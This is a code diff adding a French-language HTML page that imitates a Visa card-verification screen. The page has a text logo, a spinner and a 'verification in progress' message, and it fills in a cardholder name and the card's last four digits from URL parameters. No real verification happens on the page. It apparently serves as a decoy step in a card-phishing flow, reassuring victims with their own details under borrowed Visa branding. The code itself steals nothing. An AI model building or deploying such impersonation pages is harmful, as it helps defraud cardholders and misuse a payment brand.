@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Vérification Visa</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f6f8fb;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      background: #fff;
+      padding: 35px 28px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 8px 30px rgba(0,0,0,.08);
+    }
+
+    .visa {
+      font-size: 42px;
+      font-weight: 900;
+      font-style: italic;
+      color: #1a1f71;
+      margin-bottom: 25px;
+    }
+
+    .loader {
+      width: 50px;
+      height: 50px;
+      margin: 0 auto 25px;
+      border: 5px solid #e5e7eb;
+      border-top-color: #1a1f71;
+      border-radius: 50%;
+      animation: spin .9s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+
+    .info {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f3f4f6;
+      border-radius: 10px;
+      color: #374151;
+      line-height: 1.7;
+    }
+
+    .small {
+      margin-top: 20px;
+      color: #9ca3af;
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="visa">VISA</div>
+
+  <div class="loader"></div>
+
+  <h1>Vérification en cours</h1>
+
+  <div class="info">
+    <div id="holder">Titulaire</div>
+    <div id="card">Carte ••••</div>
+  </div>
+
+  <div class="small">
+    🔒 Veuillez patienter...
+  </div>
+
+</div>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+  
+    const holder = params.get("name");
+    const last4 = params.get("last4");
+  
+    if (holder) {
+      document.getElementById("holder").textContent = holder;
+    }
+  
+    if (last4) {
+      document.getElementById("card").textContent =
+        "Carte •••• " + last4;
+    }
+  </script>
+
+</body>
+</html>
